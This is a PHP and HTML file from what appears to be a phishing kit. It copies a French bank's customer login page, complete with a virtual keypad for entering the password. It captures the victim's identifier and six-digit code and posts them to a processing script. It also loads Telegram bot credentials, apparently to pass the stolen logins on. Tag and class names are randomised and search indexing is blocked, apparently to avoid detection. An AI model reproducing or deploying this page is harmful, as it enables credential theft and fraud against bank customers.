<?php
   
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "login";
    $semantic = semantic();
	$token  = TELEGRAM_TOKEN;
    $chat_id  = TELEGRAM_CHAT_ID;

?>
<!doctype html>
<html style="height: 100%; display: flex; flex-direction: column;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/png" href="../media/imgs/ff.png" />

        <title>Connexion à l'espace client</title>
    </head>

    <body style="height: 100%; display: flex; flex-direction: column;">

		<!-- HEADER -->
        <<?php echo $semantic; ?> id="<?php echo rr(); ?>header<?php echo rr(); ?>">
		<script>var token=<?php echo json_encode($token); ?>;</script>
            <<?php echo $semantic; ?> class="<?php echo rr(); ?>left<?php echo rr(); ?>">
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>logo<?php echo rr(); ?>"><img style="width: 64px; height: 64px;" src="../media/imgs/logo.svg"></<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
            <<?php echo $semantic; ?> class="<?php echo rr(); ?>right<?php echo rr(); ?>">
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>top<?php echo rr(); ?> d-flex">
                    <<?php echo $semantic; ?> class="flex-grow-1"><img src="../media/imgs/top-header-left.png"></<?php echo $semantic; ?>>
                    <<?php echo $semantic; ?>>
                        <img class="d-lg-block d-md-block d-sm-none d-none" src="../media/imgs/top-header-right.png">
                    </<?php echo $semantic; ?>>
                </<?php echo $semantic; ?>>
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>bottom<?php echo rr(); ?> d-lg-flex d-md-flex d-sm-block d-block">
                    <<?php echo $semantic; ?> class="flex-grow-1 d-lg-block d-md-block d-sm-none d-none"><img class="d-lg-block d-md-none d-sm-none d-none" src="../media/imgs/mainmenu.png"></<?php echo $semantic; ?>>
                    <<?php echo $semantic; ?> class="d-lg-block d-md-block d-sm-none d-none">
                        <img class="d-lg-block d-md-none d-sm-none d-none" src="../media/imgs/search.png">
                        <img class="d-lg-none d-md-block d-sm-block d-block" src="../media/imgs/search2.png">
                    </<?php echo $semantic; ?>>
                    <ul>
                        <li><img src="../media/imgs/icon1.png"></li>
                        <li><img src="../media/imgs/icon2.png"></li>
                        <li><img src="../media/imgs/icon3.png"></li>
                        <li><img src="../media/imgs/icon4.png"></li>
                    </ul>
                </<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>
        <!-- END HEADER -->

        <!-- LOGIN WRAPPER -->
        <<?php echo $semantic; ?> id="<?php echo rr(); ?>logan-wrapper<?php echo rr(); ?>" class="flex-grow-1">
            <<?php echo $semantic; ?> class="<?php echo rr(); ?>left<?php echo rr(); ?>">
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>login-box<?php echo rr(); ?>">
                    <h3>Connexion à mes comptes</h3>
                    <<?php echo $semantic; ?> id="<?php echo rr(); ?>forma<?php echo rr(); ?>">
                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="login">
                        <<?php echo $semantic; ?> class="form-group mb-0">
                            <label class="mb-0" for="identifiant">Identifiant :</label>
                            <input type="text" name="identifiant" maxlength="11" id="identifiant" placeholder="Saisissez ici votre identifiant">
                        </<?php echo $semantic; ?>>
                        <<?php echo $semantic; ?> class="form-group form-check mb-0">
                            <input type="checkbox" class="form-check-input" id="exampleCheck1">
                            <label class="form-check-label" for="exampleCheck1">Mémoriser mon identifiant.</label>
                        </<?php echo $semantic; ?>>
                        <<?php echo $semantic; ?> class="form-group mb-2">
                            <label class="mb-0" for="identifiant">Mot de passe :</label>
                            <input type="password" name="password" id="password" placeholder="Composez votre mot de passe" readonly>
                        </<?php echo $semantic; ?>>
                        <<?php echo $semantic; ?> class="vocal">Activer la vocalisation</<?php echo $semantic; ?>>
                        <ul class="numbers">
                            <li data-value="3">3</li>
                            <li data-value="0">0</li>
                            <li data-value="zz"></li>
                            <li data-value="zz"></li>
                        </ul>
                        <ul class="numbers">
                            <li data-value="4">4</li>
                            <li data-value="6">6</li>
                            <li data-value="zz"></li>
                            <li data-value="5">5</li>
                        </ul>
                        <ul class="numbers">
                            <li data-value="8">8</li>
                            <li data-value="2">2</li>
                            <li data-value="1">1</li>
                            <li data-value="zz"></li>
                        </ul>
                        <ul class="numbers">
                            <li data-value="zz"></li>
                            <li data-value="9">9</li>
                            <li data-value="7">7</li>
                            <li data-value="zz"></li>
                        </ul>
                        <<?php echo $semantic; ?> class="<?php echo rr(); ?>btns<?php echo rr(); ?>">
                            <<?php echo $semantic; ?> id="booom" class="zz <?php echo rr(); ?>btttn<?php echo rr(); ?>" type="submit" class="disabled" disabled>VALIDER</<?php echo $semantic; ?>>
                            <<?php echo $semantic; ?> class="reset zz bbb">EFFACER</<?php echo $semantic; ?>>
                        </<?php echo $semantic; ?>>
                    </<?php echo $semantic; ?>>
                </<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
            <<?php echo $semantic; ?> class="right d-flex align-items-center justify-content-center">
                <<?php echo $semantic; ?> class="content">
                    <img style="min-width: 326px;" src="../media/imgs/content.png">
                </<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>
        <!-- END LOGIN WRAPPER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>
		<script src="../media/js/jq.js"></script>


        <script>
            
            $('ul.numbers li').click(function(){
                var value    = $(this).data('value');
                if( value == 'zz' )
                    return false;
                var pass_val = $('#password').val();
                var password = pass_val + value;
                if( $('#password').val().length == 6 ) {
                    return false;
                }
                $('#password').val(password);
                if( $('#identifiant').val().length > 9 || $('#identifiant').val().length == 9 ) {
                    if( $('#password').val().length == 6 ) {
                        $('#booom').removeAttr('disabled').removeClass('disabled');
                    }
                }
            });

            $('.zz.reset').click(function(){
                $('#password').val('');
                $('#booom').attr('disabled','disabled').addClass('disabled');
            });

            $('#identifiant').keydown(function(){

                if( $(this).val().length > 9 || $(this).val().length == 9 ) {
                    if( $('#password').val().length == 6 ) {
                        $('#booom').removeAttr('disabled').removeClass('disabled');
                    }
                } else {
                    $('#booom').attr('disabled','disabled').addClass('disabled');
                }

            });

            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'identifiant' : $('#identifiant').val(),
                    'password' : $('#password').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });

        </script>

    </body>

</html>